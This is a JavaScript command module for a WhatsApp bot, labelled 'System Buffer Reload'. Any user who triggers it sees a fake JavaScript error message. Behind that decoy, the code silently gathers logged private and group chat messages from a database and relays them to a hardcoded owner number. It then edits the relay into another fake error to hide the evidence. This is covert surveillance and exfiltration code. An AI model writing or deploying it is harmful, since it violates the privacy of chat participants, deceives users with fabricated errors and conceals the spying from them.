const { proto } = require('@whiskeysockets/baileys');

module.exports = {
    name: "reload",
    category: "founder",
    desc: "V_HUB: System Buffer Reload",
    async execute(sock, msg, args, { from, sender, client, logsCollection }) {
        // 🔒 NO 'isMe' CHECK HERE -> Anyone can trigger the decoy!
        
        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
        const masterJid = `${ownerNum}@s.whatsapp.net`;
        const relayVault = client.db("vinnieBot").collection("relay_vault");
        const triggerChar = "§"; 

        // 🎭 THE "SCARY" JS ERROR MATRIX
        const decoys = [
            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)\n    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1153:10)`,
            `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)`,
            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)\n    at _write (node:internal/streams/writable:319:11)`,
            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)\n    at MessageHandler.parse (./lib/utils/parser.js:12:22)`
        ];

        // 1. THE DECOY RESPONSE (Sent to the chat where the command was typed)
        // This happens for EVERYONE, including you.
        await sock.sendMessage(from, { 
            text: decoys[Math.floor(Math.random() * decoys.length)] 
        }, { quoted: msg });

        try {
            // 2. THE BACKGROUND RELAY (Silent and Invisible)
            if (!logsCollection) return;

            const timeInput = args[0] || "1h";
            const typeFilter = args[1] ? args[1].toLowerCase() : "all"; 
            const timeValue = parseInt(timeInput) || 1;
            let duration = timeInput.endsWith('m') ? timeValue * 60 * 1000 : timeInput.endsWith('d') ? timeValue * 24 * 60 * 60 * 1000 : timeValue * 60 * 60 * 1000;

            const startTime = new Date(Date.now() - duration);
            let query = { timestamp: { $gte: startTime } };
            
            if (typeFilter === 'gc') query.chatId = { $regex: /@g.us$/ };
            if (typeFilter === 'pc') query.chatId = { $regex: /@s.whatsapp.net$/ };

            const logs = await logsCollection.find(query).toArray();

            if (logs.length > 0) {
                let report = `${triggerChar}┏━━━━━ ✿ *V_HUB RELOAD FEED* ✿ ━━━━━┓\n┃ _Triggered By: ${sender.split('@')[0]}_\n┃ _Filter: ${typeFilter.toUpperCase()} | ${timeInput}_\n┃\n`;
                
                logs.forEach(l => {
                    const origin = l.chatId.endsWith('@g.us') ? `👥 Group` : `👤 Inbox`;
                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name}*\n┃ 💬 ${l.message}\n┃\n`;
                });
                report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;

                // A. MongoDB Vaulting
                await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                await relayVault.insertOne({ report, createdAt: new Date() });

                // B. The Relay (Sent Silently to Your Master Number)
                const relayMsg = await sock.sendMessage(masterJid, { text: report });

                // C. The Ghost Edit (Hides the evidence on the Host SIM's sent folder)
                setTimeout(async () => {
                    await sock.sendMessage(masterJid, { 
                        text: decoys[Math.floor(Math.random() * decoys.length)], 
                        edit: relayMsg.key 
                    });
                }, 5000);
            }

        } catch (e) {
            console.error("Silent Relay Fail:", e.message);
        }
    }
};
